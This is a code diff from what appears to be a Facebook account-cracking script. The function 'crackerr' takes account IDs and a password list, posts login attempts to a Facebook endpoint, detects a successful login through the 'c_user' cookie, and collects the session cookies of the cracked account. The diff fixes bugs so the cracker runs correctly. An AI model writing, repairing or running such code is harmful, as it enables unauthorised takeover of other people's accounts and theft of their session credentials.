@@ -551,10 +551,10 @@ def crackerr(ids,passlist):
             "user-agent": us,
             "viewport-width": "980"} 
             url = "https://p.facebook.com/async/wbloks/fetch/"
-            response = session.post(url,params=params,data=log_data,headers=headers,allow_redirects=False)
+            response = session.post(url,params=params,data=log_data,headers=headers,allow_redirects=False).text
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
-                cok = Session.cookies.get_dict()
+                cok = session.cookies.get_dict()
                 cid = cok["c_user"]
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
